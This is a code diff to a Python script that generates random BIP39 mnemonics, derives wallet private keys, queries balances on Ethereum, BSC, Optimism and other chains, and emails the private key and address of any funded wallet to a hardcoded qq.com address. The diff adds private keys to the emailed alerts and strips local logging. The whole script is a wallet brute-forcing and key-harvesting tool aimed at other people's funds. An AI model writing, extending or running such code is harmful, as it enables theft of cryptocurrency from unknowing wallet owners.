@@ -17,10 +17,8 @@ rpc = {
     "eth_rpc" : ["https://eth.public-rpc.com"],
     "bsc_rpc" : ["https://bscrpc.com"],
     "arb_rpc" : ["https://arbitrum.public-rpc.com"],
-    "op_rpc" : ["https://optimism-mainnet.core.chainstack.com/b5f834546042e096d5941131a72726fe"],
+    "op_rpc" : ["https://optimism-mainnet.core.chainstack.com/8d22e50db5b108fa87cfdff6d0a65dc8"],
     "poly_rpc" : ["https://polygon-rpc.com"],
-    "avax_rpc" : ["https://avalanche.public-rpc.com"],
-    "scroll_rpc": ["https://arbitrum.public-rpc.com"],
 }
 
 def send_email(msg: str, recever="164093410@qq.com"):
@@ -53,15 +51,15 @@ def demo_log():
 def get_account():
     mnemonic = ' '.join(list(random.sample(bip39_words, 12)))
     private_key, public_key, address = mnemonic_to_all(mnemonic=mnemonic)
+    del mnemonic
     log = demo_log()
-    log.info(private_key, public_key, address)
     return private_key, public_key, address
 
 # 验证ETH链账户余额
-def check_eth_balance_byprivate(private_key):
+def check_eth_balance_byprivate(wallet_address, private_key, chain_rpc=rpc["eth_rpc"][0]):
     log = demo_log()
     try:
-        web3 = Web3(Web3.HTTPProvider(rpc["eth_rpc"][0]))
+        web3 = Web3(Web3.HTTPProvider(chain_rpc))
         if not web3.is_connected():
             print("RPC连接失败", "https://eth.public-rpc.com")
             return False
@@ -88,14 +86,15 @@ def check_eth_balance_byprivate(private_key):
         if eth_balance > 0 or usdt_balance > 0:
             msg = "\n私钥:" + str(private_key) + "\n地址:" + str(wallet_address) + "\nETH余额:" + str(eth_balance) + "\nUSDT余额:" + str(usdt_balance)
             send_email(msg)
-            log.success(private_key, "ETH Chain")
         return True
     except Exception as e:
         print(e, private_key, "ETH Chain")
         return False
+    finally:
+        del web3
 
 # 验证其他公链账户余额
-def check_other_balance_byaddress(wallet_address, chain_rpc=rpc["bsc_rpc"][0]):
+def check_other_balance_byaddress(wallet_address, private_key, chain_rpc=rpc["bsc_rpc"][0]):
     log = demo_log()
     try:
         w3_rpc = Web3(Web3.HTTPProvider(chain_rpc))
@@ -106,15 +105,14 @@ def check_other_balance_byaddress(wallet_address, chain_rpc=rpc["bsc_rpc"][0]):
         balance = w3_rpc.from_wei(balance_data, "ether")
         print(wallet_address, chain_rpc, balance)
         if float(balance)>0:
-            msg = "\n地址:" + str(wallet_address) + "\n网络:" + str(chain_rpc)
+            msg = "地址:" + str(wallet_address) + "\n私钥:" + str(private_key) + "\n网络:" + str(chain_rpc)
             send_email(msg)
-            log.success(wallet_address, chain_rpc)
         return True
     except Exception as e:
         print(e, wallet_address)
         return False
-
-
+    finally:
+        del w3_rpc
 
 
 
